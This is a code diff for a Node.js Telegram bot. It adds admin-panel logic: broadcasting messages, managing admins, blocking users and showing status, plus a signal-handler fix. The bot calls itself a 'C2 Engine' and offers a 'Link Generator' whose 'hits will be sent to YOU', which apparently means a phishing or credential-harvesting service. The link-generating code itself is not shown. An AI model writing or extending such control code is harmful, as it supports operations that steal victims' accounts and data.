@@ -134,14 +134,68 @@ bot.on('callback_query', async (ctx) => {
             const newAdminKeyboard = createAdminKeyboard(db.isApiActive);
             return ctx.editMessageText("👑 *Admin Panel*", { parse_mode: 'Markdown', ...newAdminKeyboard });
         }
-        
-        // ... (Baaki saare admin commands ka logic waisa hi rahega) ...
+
+        const prompts = { 'broadcast': '✍️ Send the message to broadcast.', 'add': '✍️ Send the numeric ID of the new admin.', 'remove': '✍️ Send the numeric ID to remove from admins.', 'block': '✍️ Send the numeric ID of the user to block.', 'unblock': '✍️ Send the numeric ID of the user to unblock.' };
+        if (prompts[command]) {
+            adminState[userId] = command;
+            return ctx.reply(prompts[command]);
+        }
+
+        switch(command) {
+            case 'status':
+                const totalUsers = Object.keys(db.users).length;
+                return ctx.editMessageText(`📊 *Bot Status*\n\n👥 Total Users: ${totalUsers}\n👑 Admins: ${db.admins.length}\n🚫 Blocked: ${db.blocked_users.length}`, { parse_mode: 'Markdown', ...adminKeyboard });
+            case 'generate':
+                return ctx.editMessageText("🔗 **Admin Link Generator**\nSelect a service. Hits will be sent to YOU.", linkGenerationKeyboard);
+            case 'panel':
+                return ctx.editMessageText("👑 **Admin Panel** 👑", { parse_mode: 'Markdown', ...adminKeyboard });
+        }
     }
 });
 
 // --- Text Handler ---
 bot.on('text', async (ctx) => {
-    // ... (Text handler ka code waisa hi rahega) ...
+    const userId = ctx.from.id;
+    const text = ctx.message.text;
+
+    if (!adminState[userId] || !isAdmin(userId) || text.startsWith('/')) return;
+
+    const db = readDb();
+    const action = adminState[userId];
+    delete adminState[userId];
+    const targetId = parseInt(text);
+
+    switch (action) {
+        case 'broadcast':
+            ctx.reply("📢 Broadcasting...");
+            for (const uid of Object.keys(db.users)) {
+                try { await ctx.telegram.sendMessage(uid, text); } catch {}
+            }
+            return ctx.reply("✅ Broadcast complete.");
+        case 'add':
+            if (!isNaN(targetId) && !db.admins.includes(targetId)) {
+                db.admins.push(targetId); writeDb(db);
+                return ctx.reply(`✅ Admin added: ${targetId}`);
+            }
+            return ctx.reply("❌ Invalid or existing admin.");
+        case 'remove':
+            if (targetId === parseInt(OWNER_ID)) return ctx.reply("❌ Cannot remove owner.");
+            db.admins = db.admins.filter(id => id !== targetId); writeDb(db);
+            return ctx.reply(`✅ Removed admin: ${targetId}`);
+        case 'block':
+            if (isAdmin(targetId)) return ctx.reply("❌ Cannot block admin.");
+            if (!db.blocked_users.includes(targetId)) {
+                db.blocked_users.push(targetId); writeDb(db);
+                return ctx.reply(`🚫 Blocked: ${targetId}`);
+            }
+            return ctx.reply("⚠️ Already blocked.");
+        case 'unblock':
+            if (db.blocked_users.includes(targetId)) {
+                db.blocked_users = db.blocked_users.filter(id => id !== targetId); writeDb(db);
+                return ctx.reply(`✅ Unblocked: ${targetId}`);
+            }
+            return ctx.reply("❌ ID not found in block list.");
+    }
 });
 
 // --- "STAY-ALIVE" SERVER ---
@@ -157,5 +211,6 @@ http.createServer((req, res) => {
 bot.launch();
 console.log('🔥 Flawless C2 Engine is online.');
 
+// THE FIX: This line was broken before. Now it is correct.
 process.once('SIGINT', () => bot.stop('SIGINT'));
-process.once('SIGTERM', '() => bot.stop('SIGTERM'));
+process.once('SIGTERM', () => bot.stop('SIGTERM'));
